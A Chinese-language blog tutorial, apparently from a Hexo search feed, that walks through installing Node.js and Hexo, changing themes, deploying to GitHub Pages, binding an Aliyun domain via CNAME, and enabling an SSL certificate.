    <content type="html"><![CDATA[<h2 id="一、hexo是什么？"><a href="#一、hexo是什么？" class="headerlink" title="一、hexo是什么？"></a>一、hexo是什么？</h2><p>​        hexo 可以理解为是基于node.js制作的一个博客工具，简单来说利用hexo框架可以快速搭建一个属于自己的博客网站</p><p>​       关于hexo的介绍，官网上的介绍很详细了。<a href="https://hexo.io/">https://hexo.io/</a></p><h2 id="二、本地快速搭建hexo博客"><a href="#二、本地快速搭建hexo博客" class="headerlink" title="二、本地快速搭建hexo博客"></a>二、本地快速搭建hexo博客</h2><h3 id="1、安装Node-js"><a href="#1、安装Node-js" class="headerlink" title="1、安装Node.js"></a>1、安装Node.js</h3><p>进入node.js官网，下载LTS长期支持版</p><p><img src="/images/nodejs.jpg"></p><h3 id="2、下载hexo"><a href="#2、下载hexo" class="headerlink" title="2、下载hexo"></a>2、下载hexo</h3><p>打开命令行</p><p>切换到root权限：sudu su</p><p>查看nodejs的版本和npm的版本：node -v     npm -v</p><p>需要借助nmp安装包，但是国内很慢，所以需要借助国内的nmp包管理器 npm install -g cnpm –registry=<a href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org</a></p><p>检测cnpm是否安装成功，输入cnpm -v</p><p>借助cnpm全局安装hexo   cnpm install -g hexo-cli   然后验证 hexo -v</p><h3 id="3、本地搭建hexo博客"><a href="#3、本地搭建hexo博客" class="headerlink" title="3、本地搭建hexo博客"></a>3、本地搭建hexo博客</h3><p>本地建立一个空文件夹 blog 所有博客文件全部在blog中生成，如果出错，删除重来</p><p>进入blog 文件</p><p>sudu hexo init 初始化一个hexo博客</p><p>hexo s 启动</p><h3 id="4、编写博客文章"><a href="#4、编写博客文章" class="headerlink" title="4、编写博客文章"></a>4、编写博客文章</h3><p>hexo n “我的第一篇博文”      会生成到source/_posts文件下</p><p>hexo clean 清除缓存</p><p>hexo g 重新生成 然后访问 <a href="http://localhost:4000/">http://localhost:4000</a> 就可以了</p><p>我一般会用Typora软件写博客</p><pre><code class="hljs java">安装 代码高亮插件 <span class="hljs-comment">// 1.卸载 Hexo 默认自带的 Markdown 渲染器</span>cnpm un hexo-renderer-marked --save<span class="hljs-comment">// 2.安装 hexo-renderer-markdown-it 插件</span>cnpm i hexo-renderer-markdown-it --save<span class="hljs-comment">// 3.修改_config配置文件</span>markdown: <span class="hljs-string">&#x27;commonmark&#x27;</span><span class="hljs-comment">// 4.关闭hexo自带的渲染插件</span>highlight:  enable: <span class="hljs-keyword">false</span> <span class="hljs-comment">// 关闭</span>  line_number: <span class="hljs-keyword">true</span>  auto_detect: <span class="hljs-keyword">false</span>  tab_replace: <span class="hljs-string">&#x27;&#x27;</span>  wrap: <span class="hljs-keyword">true</span>  hljs: <span class="hljs-keyword">false</span></code></pre><h3 id="5、修改hexo主题"><a href="#5、修改hexo主题" class="headerlink" title="5、修改hexo主题"></a>5、修改hexo主题</h3><p>直接在官网获取更多主题 <a href="https://hexo.io/themes/">https://hexo.io/themes/</a>  ，选择自己喜欢的主题，获取git路径</p><p>比如我下载的主题是 yilia</p><p>git clone <a href="https://github.com/litten/hexo-theme-yilia.git">https://github.com/litten/hexo-theme-yilia.git</a> themes/yilia</p><p>修改配置文件_config.yml</p><p>theme: landscape 修改为 theme: yilia</p><p>然后重新执行命令就可以了 </p><p>hexo clean </p><p>hexo g </p><p>hexo s</p><h2 id="三、将博客部署到github"><a href="#三、将博客部署到github" class="headerlink" title="三、将博客部署到github"></a>三、将博客部署到github</h2><p>一般我们的博客会部署到github上，这样就可以远端访问了</p><p>创建github账号(以我的github为例  lukaixin0527)，并且创建一个库 库名格式必须为 ： lukaixin0527.github.io</p><p>下载一个部署插件,进入blog文件夹下 cnpm install –save hexo-deployer-git</p><p>修改设置，修改_config.yml 到文件的最底部 repo:为github路径</p><p>deploy:</p><p> type: git</p><p> repo: <a href="https://github.com/lukaixin0527/lukaixin0527.github.io.git">https://github.com/lukaixin0527/lukaixin0527.github.io.git</a>            </p><p> branch: master</p><p>最后部署到远端 hexo d  输入github账号和密码就可以了</p><p>如果提示403，说明没有切换github账号信息，找到本地的账号密码信息删除即可。</p><p>如果成功了，直接访问xxxxx.github.io就可以访问了，比如我的github博客网址 lukaixin0527.github.io</p><h2 id="四、域名绑定"><a href="#四、域名绑定" class="headerlink" title="四、域名绑定"></a>四、域名绑定</h2><p>首先需要购买一个域名</p><p>我是在阿里云买的域名 lukaixin.com</p><p>然后需要实名认证后才可以使用</p><h3 id="1、解析域名"><a href="#1、解析域名" class="headerlink" title="1、解析域名"></a>1、解析域名</h3><p>​        就是把网站域名解析到你所购买的网站空间(云服务器)IP上，其实这里说的解析就是一个绑定和指向关系，网站域名指向空间IP地址。</p><p>​        简单来说，就是访问购买的域名就可以访问到github上的博客网址</p><p>​        接下来开始解析域名</p><p>​        这是我的域名，已经实名认证了，DNS服务器状态显示 正常</p><p>​        <img src="/images/aliyunhoutai.jpg">        </p><p>​        点击解析设置——添加记录，选择CNAME类型(将一个域名指向另一个域名的类型)</p><p>​        到这里，域名解析的完成了第一步</p><h3 id="2、github设置"><a href="#2、github设置" class="headerlink" title="2、github设置"></a>2、github设置</h3><p>​         在github仓库首页，选择自己的仓库 (lukaixin0527.github.io)</p><p>​         找到 create new file ，点击新建文件</p><p>​         文件名称命名为 <strong>CNAME</strong></p><p>​         内容填写自己的域名 比如我的 <a href="http://www.lukaixin.com/">www.lukaixin.com</a> </p><p>​         最后点击commit new file 提交文件就可以</p><h3 id="3、配置成功"><a href="#3、配置成功" class="headerlink" title="3、配置成功"></a>3、配置成功</h3><p>​          到这里域名就配置成功了，直接访问域名，就可以访问了</p><h2 id="五、配置SSL安全证书"><a href="#五、配置SSL安全证书" class="headerlink" title="五、配置SSL安全证书"></a>五、配置SSL安全证书</h2><p><strong>HTTP</strong>是明文传输协议，传输内容容易被嗅探和篡改。</p><p>而<strong>HTTPS</strong>，即<strong>HTTP over SSL/TLS</strong>,是添加了一层<strong>SSL(Secure Sockets Layer，安全套接层)**，或者是</strong>TLS(Transport Layer Security,<strong>**传输层安全协议)**，所以</strong>HTTPS<strong>就可以视为</strong>HTTP<strong>和</strong>SSL/TLS**协议的组合。</p><p><strong>HTTPS</strong>能做到良好的保密性(防嗅探)，真实性(防篡改)，完整性(防域名劫持和域名欺骗)。</p><h3 id="1、购买证书"><a href="#1、购买证书" class="headerlink" title="1、购买证书"></a>1、购买证书</h3><p>进入阿里云首页，直接搜索SSL证书，点击购买，进入证书选择页面</p><p>因为我的证书是在阿里云购买的，所有可以享受一年免费的证书(嘿嘿~)</p><p><img src="/images/zhengshuxuanze.jpg"></p><h3 id="2、证书申请"><a href="#2、证书申请" class="headerlink" title="2、证书申请"></a>2、证书申请</h3><p>购买证书成功后，进入证书详情，点击【证书申请】，填写相关信息，注意填写正确的域名</p><p>因为我的证书和域名都在阿里云购买，所有可以享受自动DNS验证，不需要自己去验证了</p><p>点击下一步，再点击验证，到这里就ok了，只需要耐心等待审核就可以了。</p><img src="/images/zhengshushenqing.jpg" style="zoom:35%;" /><h3 id="3、配置成功-1"><a href="#3、配置成功-1" class="headerlink" title="3、配置成功"></a>3、配置成功</h3><p>等待证书配置成功后，就可以安全访问了。</p><p>比如我的域名：<a href="https://www.lukaixin.com/">https://www.lukaixin.com/</a></p>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
